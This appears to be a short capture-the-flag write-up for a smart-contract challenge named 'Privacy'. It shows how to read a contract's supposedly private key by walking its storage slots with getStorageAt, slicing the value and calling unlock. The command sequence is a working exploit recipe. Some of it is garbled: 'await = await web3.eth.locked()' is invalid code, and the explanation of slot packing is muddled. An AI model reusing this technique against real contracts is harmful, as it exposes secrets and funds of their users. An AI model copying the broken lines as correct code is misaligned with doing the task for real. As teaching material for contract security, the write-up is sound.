# Privacy

## Description

This smart contract is a more complex version of [#8 Vault](contracts/vault).
We know that we need that the key is the last value stored in storage so we just
use `web3.eth.getStorageAt()` until we get 0. The last slot is 5 because the
three `uint` variables only take up 1 slot (each slot is 32 bytes). We then
slice the last storage value in half due to the `bytes16()` cast.

## Command Sequence

```
> await = await web3.eth.locked()
true
> await web3.eth.getStorageAt(instance, 0)
some hex value
> await web3.eth.getStorageAt(instance, 1)
some hex value
> await web3.eth.getStorageAt(instance, 2)
some hex value
> await web3.eth.getStorageAt(instance, 3)
some hex value
> await web3.eth.getStorageAt(instance, 4)
some hex value
> await web3.eth.getStorageAt(instance, 5)
some hex value
> await web3.eth.getStorageAt(instance, 6)
'0x0000000000000000000000000000000000000000000000000000000000000000
> value = await web3.eth.getStorageAt(instance, 5)
> await contract.unlock(value.slice(0,34))
> await = await web3.eth.locked()
false
```
